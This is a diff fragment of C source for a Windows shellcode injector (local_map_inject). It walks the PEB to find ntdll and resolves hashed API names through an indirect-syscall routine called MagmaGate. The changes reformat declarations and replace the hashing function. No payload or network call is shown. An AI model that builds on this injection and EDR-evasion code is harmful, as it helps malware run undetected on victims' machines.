@@ -13,19 +13,18 @@ BOOL local_map_inject
 
 {
 
-	// Variables needed for debugging + values
-
-	BOOL State = TRUE;
-	HANDLE hFile = NULL, hSection = NULL;
-	PVOID MLocalAddress = NULL;
-	SIZE_T size = sShellSize;
-	PLARGE_INTEGER maxSize = { size };
-	HMODULE ntdll = NULL;
-	NTSTATUS STATUS = NULL;
-	PVOID localaddress = NULL;
-	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
-	SYSCALL_INFO info = { 0 };
-	INSTRUCTIONS_INFO syscallInfos[3] = { 0 };
+	BOOL					State			= TRUE;
+	HANDLE					hFile			= NULL, 
+							hSection		= NULL;
+	PVOID					MLocalAddress	= NULL;
+	SIZE_T					size			= sShellSize;
+	PLARGE_INTEGER			maxSize			= { size };
+	HMODULE					ntdll			= NULL;
+	NTSTATUS				STATUS			= NULL;
+	PVOID					localaddress	= NULL;
+	PIMAGE_EXPORT_DIRECTORY pImgDir			= NULL;
+	SYSCALL_INFO			info			= { 0 };
+	INSTRUCTIONS_INFO		syscallInfos[3] = { 0 };
 
 	ntdll = WalkPeb();
 	if (!ntdll)
@@ -53,10 +52,8 @@ BOOL local_map_inject
 
 	for (size_t i = 0; i < FuncSize; i++)
 	{
-		DWORD apiHash = GetBaseHash(
-			Functions[i],
-			ntdll,
-			pImgDir
+		DWORD apiHash = sdbmrol16(
+			Functions[i]
 		);
 
 		MagmaGate(pImgDir, ntdll, apiHash, &info);
